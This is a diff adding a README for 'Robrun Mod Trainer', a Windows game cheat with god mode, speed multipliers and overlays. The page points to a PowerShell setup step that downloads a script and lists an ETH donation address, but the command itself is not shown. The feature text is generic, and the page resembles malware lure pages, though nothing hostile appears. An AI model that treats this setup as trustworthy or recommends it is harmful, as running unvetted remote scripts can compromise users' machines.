@@ -1,0 +1,86 @@
+Robrun Mod Trainer — Windows 10/11
+
+🛠️ PowerShell Setup Button
+
+Help keep this going
+
+ETH:&nbsp;0xC912BC89EDbf5EA377290F481D597f096f874600
+
+Robrun Mod Trainer delivers real-time gameplay assistance and clean information overlays built straight into the action. It surfaces the stats, timers, and status cues that matter without cluttering your screen, so you stay locked in when the pace picks up. Every overlay is tuned for readability, keeps pace with fast gameplay, and stays out of the way when you need focus. This is assistance and information done right, no detours and no unnecessary changes to the game itself.
+
+✅ Before You Start
+
+- OS: Windows 10 / 11
+- Shell: PowerShell 5.1+ or PowerShell 7+
+- Network: internet access to download the script
+- Privileges: standard user
+
+Features
+
+- Live gameplay assistance — toggles for the mechanics you actually care about, applied in real time without restarting the run. Enable what you need, drop it the moment you don't.
+- Information overlays — on-screen readouts for the stats and state that matter mid-run, so you're making decisions off data instead of guesswork.
+- Hotkey-driven control — bind actions to keys you already use. No menu diving, no alt-tabbing, no breaking flow.
+- Per-feature granularity — every assist and overlay is independent. Run a single overlay for clean info, or stack the full toolkit; the trainer doesn't force a package deal.
+- Instant on/off switching — features apply and revert live, so you can test a setup, dial it back, and keep playing.
+- Lightweight footprint — built to sit alongside the game without dragging on performance or altering content outside its scope.
+- Persistent configuration — your toggles, hotkeys, and overlay layout stick between sessions, so setup is a one-time job.
+- Transparent behavior — each feature does exactly what it says: gameplay assistance and information, nothing more.
+
+How it works
+
+Robrun Mod Trainer sits between you and the game, reading the state the engine already exposes and turning it into actionable assistance. Nothing gets rewritten behind your back — it hooks the running session, watches for the values that matter, and acts only when you tell it to.
+
+Live state reading. The trainer attaches to the active session and samples the game's own values each frame — movement speed, health, stamina, cooldowns, resource counts, and whatever else the current profile tracks. There's no guesswork and no scanning loop churning in the background; it reads what the engine reports and keeps a rolling snapshot you can inspect at any time.
+
+Gameplay assistance on demand. Every assist is a toggle, not an always-on rewrite. Flip on a speed multiplier and it scales the value the game already uses; flip it off and the original behavior returns untouched. God mode, infinite stamina, instant cooldowns, damage multipliers — each one is an independent switch you control mid-session, so you can dial in exactly as much help as you want and nothing more.
+
+Information overlays. The overlay layer renders on top of the game without touching its render pipeline. You get a live readout of tracked stats, active toggles, and session state — positioned, scaled, and opacity-adjusted to stay out of your way. Toggle the whole overlay with a hotkey when you want a clean screen, or leave it up for constant feedback while you play.
+
+Hotkey-driven control. Everything is bound to keys you can rebind. Toggle assists, cycle profiles, show or hide the overlay, and freeze or resume the trainer — all without alt-tabbing. Changes apply to the running session immediately; no restart, no reload.
+
+Profiles and presets. Save any combination of toggles and overlay settings as a profile, then switch between them on the fly. One profile for casual messing around, another for pushing a specific build — swap with a hotkey and the trainer reconfigures itself to match.
+
+Safe application model. The trainer holds the original values and restores them when an assist is disabled or the session ends. It doesn't patch game files on disk, doesn't inject persistent changes, and doesn't alter anything outside the live session. Close it and the game runs exactly as it shipped.
+
+Modules and Settings
+
+Live Value Module
+This module handles the moment-to-moment tuning of numeric gameplay values during an active session, acting as the primary workspace where adjustments take effect immediately.
+- Value selection lets the user pick which gameplay value to adjust, and the chosen value becomes the active target for the step and range controls below.
+- The apply action commits the pending value to the session, so the change registers in-game while play continues.
+- A pending-versus-applied readout keeps it clear whether the displayed number is already live or still waiting to be applied.
+- Adjustments made here can be captured into a profile so a working setup is not lost when the session ends.
+
+Modifier Toggle Module
+This module governs the individual gameplay modifiers that can be switched on and off independently, giving the user direct control over which effects are active.
+- Each modifier has its own toggle, and its state is shown in the interface so the enabled set is visible at a glance.
+- Switching a modifier off returns the affected behavior to default, so effects do not linger after being disabled.
+- Grouping by related gameplay area lets the user scan and flip several modifiers without hunting through a flat list.
+- The current toggle combination feeds directly into profile saving and into the status display, keeping both in sync with what is actually enabled.
+
+Preset Profile Module
+This module stores and restores combinations of toggles and values, making it practical to move between distinct setups for different play styles or testing scenarios.
+- Saving a profile captures the current toggle and value configuration under a user-chosen name.
+- Loading a profile applies the stored configuration in a single step rather than re-entering each option by hand.
+- Profile management actions allow renaming and removing saved profiles so the list stays relevant.
+- The active profile is reported in the status display, and any manual change made after loading marks the setup as modified from its stored form.
+
+Hotkey Binding Module
+This module maps gameplay adjustments to keyboard shortcuts so changes can be triggered without leaving the game view.
+- Assignment controls bind a chosen action to a key, and the binding can be reassigned later to a different key.
+- Conflict detection surfaces bindings that overlap, prompting the user to resolve them before they cause unintended triggers.
+- The binding list shows every active shortcut in one place, so the user can review coverage across toggles and values.
+- Pressing a bound key performs the associated change during play, and key bindings are included in configuration persistence alongside toggles and values.
+
+Value Range and Step Module
+This module defines the numeric boundaries and increment behavior for adjustable values, supporting both coarse and fine control from a single set of controls.
+- Range controls set the allowed bounds for a value, and the interface indicates when the current value sits at a limit.
+- Step size selection switches between larger increments for quick coarse changes and smaller ones for fine-tuning.
+- A live indication of the current value against its configured bounds helps the user judge how much room remains before a limit is hit.
+- Range and step choices are per-value, so tuning one option finely does not force the same granularity on others.
+
+Session Status and Reset Module
+This module provides a consolidated view of the session state and a way to return everything to defaults, tying the other modules together into a coherent picture.
+- Status indicators report which modifiers are active, which profile is loaded, and whether pending changes have been applied.
+
+…（内容已截断）
